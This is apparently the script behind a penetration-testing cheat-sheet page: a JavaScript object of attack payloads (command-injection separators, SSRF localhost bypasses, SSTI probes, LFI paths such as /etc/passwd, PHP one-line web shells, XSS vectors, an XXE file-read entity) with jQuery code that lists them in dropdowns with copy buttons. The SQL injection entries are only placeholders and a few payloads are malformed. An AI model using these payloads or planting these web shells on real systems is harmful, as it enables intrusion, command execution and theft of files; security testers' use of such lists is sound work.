const payloads = {
    "Command_Injection": {
        "Basic": [
            "| <command>",
            "&& <command>",
            "; <command>",
            "%0a <command>",
            "'; <command>",
            "\"; <command>",
            "\`<command>\`",
            "\$(<command>)"
        ],
        "Bypass": [
            "${IFS}"
        ]
    },
    "SQL_injection": {
        "Boolean Base": [
            "b1",
            "b2"
        ],
        "Error Base": [
            "e1",
            "e2"
        ]
    },
    "SSRF": {
        "IP": [
            "127.0.0.1",
            "localhost",
            "127.0.1",
            "127.1",
            "0.0.0.0",
            "0.0",
            "0",
            "::1",
            "::127.0.0.1",
            "::ffff:127.0.0.1",
            "::1%1",
            "127.12.34.56 (127.0.0.1/8)",
            "127.0.0.1.xip.io",
            "http://2130706433 (decimal)",
            "http://0x7f000001",
            "http://017700000001",
            "http://0x7f.0x0.0x0.0x1",
            "http://0177.0.0.1",
            "http://0177.01.01.01",
            "http://0x7f.1",
            "http://[::]"
        ]
    },
    "SSTI": {
        "Payload": [
            "${7*7}",
            "{{7*}}",
            "{{7*‘7’}}",
            "a{comment}b",
            "${\"z\".join(\"ab\")}"
        ]
    },
    "Local_File_Inclusion": {
        "PATH": [
            "…/…/…/…/…/…/…/…/…/…/…/…/…/…/…/…/…/…/",
            "/etc/passwd",
            "/etc/httpd/conf/httpd.conf",
            "/tmp/sess_{SESSION_ID}",
            "/proc/self/environ"
        ],
        "wrapper": [
            "php://filter/read=convert.base64-encode/resource=/path/to/file",
            "php://input"
        ]
    },
    "Web_Shell": {
        "PHP": [
            "<?php eval($_POST[cmd]);?>",
            "<?php echo `$_GET[1]`;",
            "<?php $_GET['a']($_GET['b']); ?>"
        ],
    },
    "XSS": {
        "Vector": [
            "<script>alert(1)</script>",
            "<svg/onload=alert(1)>",
            "`<video src=x onerror=alert(1)>`",
        ],
        "Locator": [
            "'';!--\"<XSS>=&{()}"
        ]
    },
    "XXE": {
        "basic": [
            "<?xml version= \"1.0\" encoding= \"utf - 8\"?><!DOCTYPE ANY[< !ENTITY name SYSTEM \"file:///file/to/path\">]><foo><bar>&name;</bar></foo>"
        ]
    }
}
function copy(str){
    var $temp = $("<input>");
    $("body").append($temp);
    $temp.val(str).select();
    document.execCommand("copy");
    $temp.remove();
}

for(let s in payloads){
    let sel = $(`<select class="ui dropdown payload-select" name="${s}" id="${s}">`);
    let holder = $('<option value=""></option>').text(s);
    sel.append(holder)
    for(let p in payloads[s]){
        let opt = $(`<option value="${p}"></option>`).text(p);
        sel.append(opt)
    }
    $('#payload-select-container').append(sel);
}

$('.payload-select').change(e=>{
    //select one
    const id = e.target.name;
    const value = $(`#${id}`).dropdown('get value');
    if(! value) return;

    //clear other select
    for(let s in payloads){
        if(s != id){
            $(`#${s}`).dropdown('restore defaults');
        }
    }

    //clear old payload
    $('#payload-container').text('');

    //display payload
    const ps = payloads[id][value];
    for(let i in ps){
        let msg = $('<div class="ui olive message payload-message"></div>');
        let pay = $('<div class="payload"></div>').text(ps[i]);
        let co = $('<div class="ui icon button copy-button" data-tooltip="COPY"><i class="copy outline icon"></i></div>');
        co.click(()=>{
            copy(ps[i]);
            co.attr('data-tooltip', 'OK!');
            setTimeout(() => {
                co.attr('data-tooltip', 'COPY');
            }, 500);
        })
        msg.append(pay);
        msg.append(co);
        $('#payload-container').append(msg);
    }
    
    
})
